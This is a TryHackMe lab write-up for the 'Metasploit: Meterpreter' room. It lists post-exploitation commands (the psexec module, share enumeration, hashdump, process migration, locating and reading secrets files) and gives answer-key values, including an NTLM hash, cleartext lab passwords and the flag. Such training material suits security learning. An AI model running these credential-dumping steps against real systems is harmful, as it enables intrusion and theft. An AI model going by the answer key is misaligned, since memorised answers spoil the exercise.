![Metasploit: Meterpreter Banner](https://assets.tryhackme.com/room-banners/metasploit.png)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/meterpreter/Metasploit_Meterpreter_Cover.png" alt="Metasploit: Meterpreter Logo">
</p>

# Metasploit: Meterpreter

This guide contains the answer and steps necessary to get to them for the [Metasploit: Meterpreter](https://tryhackme.com/room/meterpreter) room.

### Post-Exploitation Challenge

```cmd
sysinfo
```
```cmd
exploit/windows/smb/psexec
```
```cmd
post/windows/gather/enum_shares
```
```cmd
hashdump
```
```cmd
migrate 752
```
```cmd
hashdump
```
```cmd
search -f secrets.txt
```
```cmd
cat "c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt"
```
```cmd
search -f realsecret.txt
```
```cmd
cat "c:\inetpub\wwwroot\realsecret.txt"
```

1. What is the computer name?

   

   ><details><summary>Click for answer</summary>ACME-TEST</details>

2. What is the target domain?

   

   ><details><summary>Click for answer</summary>FLASH</details>

3. What is the name of the share likely created by the user?

   

   ><details><summary>Click for answer</summary>speedster</details>

4. What is the NTLM hash of the jchambers user?

   

   ><details><summary>Click for answer</summary>69596c7aa1e8daee17f8e78870e25a5</details>

5. What is the cleartext password of the jchambers user?

   

   ><details><summary>Click for answer</summary>Trustno1</details>

6. Where is the "secrets.txt"  file located?

   

   ><details><summary>Click for answer</summary>c:\Program Files (x86)\Windows Multimedia Platform</details>

7. What is the Twitter password revealed in the "secrets.txt" file?

   

   ><details><summary>Click for answer</summary>KDSvbsw3849!</details>

8. Where is the "realsecret.txt" file located?

   

   ><details><summary>Click for answer</summary>c:\inetpub\wwwroot</details>

9. What is the real secret? 

   

   ><details><summary>Click for answer</summary>The Flash is the fastest man alive</details>
